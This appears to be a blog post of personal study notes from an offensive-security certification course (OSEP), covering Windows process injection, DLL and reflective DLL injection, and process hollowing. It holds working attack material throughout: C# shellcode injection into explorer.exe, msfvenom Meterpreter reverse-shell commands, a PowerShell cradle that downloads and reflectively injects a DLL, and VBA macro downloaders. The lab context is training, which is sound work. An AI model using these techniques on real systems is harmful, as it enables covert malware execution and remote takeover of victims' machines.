---
title: Process Injection & Migration
author: gent79
date: 2023-01-14
categories: [OSEP]
mermaid: true
tags: [Red Team, process_injection,windows,C#]     # TAG names should always be lowercase
---
# Learning PE

![Untitled](/assets/img/2023-01-14-OSEP-Process-Injection-Migration/Untitled.png)

# Process Injection in C#

The purpose of injecting or migrating a Process is to overcome two potential issues: 1, the infected process might be closed ; 2, the network communication initiated by the process might be blocked by security software 

API used for process injection:
```mermaid
flowchart LR
stateDiagram-v2
OpenProcess() --> VirtualAllocEx()
VirtualAllocEx() --> WriteProcessMemory()
WriteProcessMemory() --> CreateRemoteThread()
```

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(
     uint processAccess,
     bool bInheritHandle,
     uint processId
);
public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
{
     return OpenProcess(flags, false, (uint)proc.Id);
}

[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
   uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
  public static extern bool WriteProcessMemory(
  IntPtr hProcess,
  IntPtr lpBaseAddress,
  byte[] lpBuffer,
  Int32 nSize,
  out IntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll")] 
        static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId);

int Size = buf.Length;
            uint uSize = Convert.ToUInt32(Size);

            Process[] localByName = Process.GetProcessesByName("Explorer");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id); 
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, uSize, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

msfvenom -p windows/metepreter/reverse_https LHOST=192.168.49.66 LPORT=7979 -f
```

### Exercises #3

![Untitled](/assets/img/2023-01-14-OSEP-Process-Injection-Migration/Untitled%201.png)

VBA —> download a powershell —> perform process injection 

in OSEP tutorial, it initiates a shell to run “powershell” cmdlet to download staged powershell. 

What I want to try is using VB Macro to download Powershell script and execute it, the difference is my approach only invokes Powershell once.

VBA download file from URL:

1. Win32 API
    
    ```visual-basic
    Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As LongPtr _
    ) As Long
    
    Sub DownloadFile()
         URLDownloadToFileA 0, "https://bit.ly/2B1GCyQ", "ts.jpg", 0, 0
    End Sub
    ```
    
2. COM Object
    
    ```visual-basic
    Sub DownloadFile()
        Set objXMLHTTP = CreateObject("Microsoft.XMLHTTP")
        Set objADODBStream = CreateObject("ADODB.Stream")
        objXMLHTTP.Open "GET", "https://bit.ly/2B1GCyQ", False
        objXMLHTTP.Send
        objADODBStream.Type = 1
        objADODBStream.Open
        objADODBStream.Write objXMLHTTP.responseBody
        objADODBStream.savetofile "ts.jpg", 2
    End Sub
    ```
    
    `powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1')`
    
    What next ? I need to cook up the powershell in which 
    

# DLL Injection

<aside>
💡 However, there are several restrictions we must consider. First, the DLL must be written in C or C++ and must be unmanaged. The managed C#-based DLL we have been working with so far will not work because we can not load a managed DLL into an unmanaged process.

</aside>

![Untitled](/assets/img/2023-01-14-OSEP-Process-Injection-Migration/Untitled%202.png)

[https://www.partech.nl/en/publications/2021/03/managed-and-unmanaged-code---key-differences#](https://www.partech.nl/en/publications/2021/03/managed-and-unmanaged-code---key-differences#)

![Untitled](/assets/img/2023-01-14-OSEP-Process-Injection-Migration/Untitled%203.png)

1. Malicious Process carves out a memory space on target process;
2. Trick the target process to invoke “LoadLibrary function” with malicious DLL which is stored on disk space in first place;

This technique is kind of old and has a significant drawback of leaving malicious DLL on disk and loading to target process, it would be easily detected by EDR.

# Reflective DLL Injection

```powershell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.66 LPORT=4455 EXITFUNC=thread -f dll -o met2.dll

$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.66:7979/met2.dll')
$procid = (Get-Process -Name explorer).Id

Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

![Untitled](/assets/img/2023-01-14-OSEP-Process-Injection-Migration/Untitled%204.png)

Even though, the above execution generates some error messages, the reflective DLL still has been invoked successfully. 

How to use metasploit to setup multiple handlers which are listening on different ports ? 

Use “run -jz” command to move current handler to backend job

```powershell
msf6 exploit(multi/handler) > run -jz
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.49.66:4456
msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                                Payload opts
  --  ----                    -------                                ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_https  https://192.168.49.66:4456
```

# Process Hollowing

When a process is created by CreateProcess () function, the OS does the following 3 things: 

1. Creates the virtual memory space for the new process.
2. Allocates the stack along with the *Thread Environment Block* (TEB) and the *Process Environment Block* (PEB).[4](https://portal.offensive-security.com/courses/pen-300/books-and-videos/modal/modules/process-injection-and-migration/process-hollowing/process-hollowing-theory#fn4)
3. Loads the required DLLs and the EXE into memory.

the idea of process hollowing is the bootstrap application creates an benign process and move it into suspended status, then replace this innocent image in memory with malicious image, if its base location doesn’t match the replaced one, performing rebase action, and then the EAX register of the suspended threat is set to the entry point.

What is the image memory relocation or rebase ?  relocation table ?

What is the structure of PE file ? 

[https://0xrick.github.io/win-internals/pe1/](https://0xrick.github.io/win-internals/pe1/)

I am building the program on x64 processor, but why the size of “IntPtr” is 4, instead of 8 ? 

Before compiling the project, it is mandatory to set the CPU to “x64” , Using “exiftool” can the type as well. PE32 is 32bit, PE32+ is 64bit

```powershell
root@lucid-action-1:/home/osep_reid/data/ProcessHollowing/ProcessHollowing/ProcessHollowing/bin/x64/Debug# exiftool ProcessHollowing.exe
ExifTool Version Number         : 12.40
File Name                       : ProcessHollowing.exe
Directory                       : .
File Size                       : 7.0 KiB
File Modification Date/Time     : 2023:01:11 05:48:27+00:00
File Access Date/Time           : 2023:01:11 05:48:39+00:00
File Inode Change Date/Time     : 2023:01:11 05:48:31+00:00
File Permissions                : -rwxr--r--
File Type                       : Win64 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : AMD AMD64
Time Stamp                      : 2066:08:19 13:06:51+00:00
Image File Characteristics      : Executable, Large address aware
PE Type                         : PE32+
Linker Version                  : 48.0
Code Size                       : 5120
Initialized Data Size           : 1536
Uninitialized Data Size         : 0
Entry Point                     : 0x0000
OS Version                      : 4.0
Image Version                   : 0.0
Subsystem Version               : 6.0
Subsystem                       : Windows command line
File Version Number             : 1.0.0.0
Product Version Number          : 1.0.0.0
File Flags Mask                 : 0x003f
File Flags                      : (none)
File OS                         : Win32
Object File Type                : Executable application
File Subtype                    : 0
Language Code                   : Neutral
Character Set                   : Unicode
Comments                        : 
Company Name                    : 
File Description                : ProcessHollowing
File Version                    : 1.0.0.0
Internal Name                   : ProcessHollowing.exe
Legal Copyright                 : Copyright ©  2023
Legal Trademarks                : 
Original File Name              : ProcessHollowing.exe
Product Name                    : ProcessHollowing
Product Version                 : 1.0.0.0
Assembly Version                : 1.0.0.0
```

This piece of code failed to resume the suspended thread, When I manually resume it through Process explorer, the shellcode has been successfully executed. 

```csharp
ResumeThread(pi.hProcess)
```

Why it fails ? How to debug and fix ? 

Reference:

PEB and TEB

[https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/](https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/)

[https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-hollowing](https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-hollowing)
